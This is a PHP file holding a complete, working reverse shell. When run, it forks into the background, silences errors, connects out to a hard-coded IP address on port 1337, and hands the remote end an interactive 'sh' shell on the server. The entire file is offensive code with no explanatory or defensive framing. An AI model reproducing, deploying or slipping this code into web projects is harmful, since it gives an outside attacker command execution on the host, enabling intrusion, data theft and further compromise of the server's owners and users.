<?php
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w')
    );
    private $buffer  = 1024;
    private $clen    = 0;
    private $error   = false;
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        $this->os    = 'LINUX';
        $this->shell = 'sh';
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "err pcntl_fork()\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "err fork\n";
        } else if ($pid > 0) {
            $exit = true;
        } else if (posix_setsid() < 0) {
            echo "err SID\n";
        } else {
            echo "success\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0);
        @umask(0);
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) {
            $this->error = true;
            echo "err read ${name}\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) {
            $this->error = true;
            echo "err write ${name}\n";
        }
        return $bytes;
    }
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); }
            $this->dump($data);
        }
    }
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data);
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "err {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false);
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "err shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false);
                    }
                    $status = proc_get_status($process);
                    @fwrite($socket, "shell connected PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) {
                            echo "err terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {
                            echo "err terminated\n";   break;
                        }
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]),
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);
                        if ($num_changed_streams === false) {
                            echo "err stream_select()\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }
                            if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }
                            if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }
                        }
                    } while (!$this->error);
                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                fclose($socket);
            }
        }
    }
}
echo '<pre>';
$sh = new Shell('5.53.126.140', 1337);
$sh->run();
unset($sh);
echo '</pre>';
?>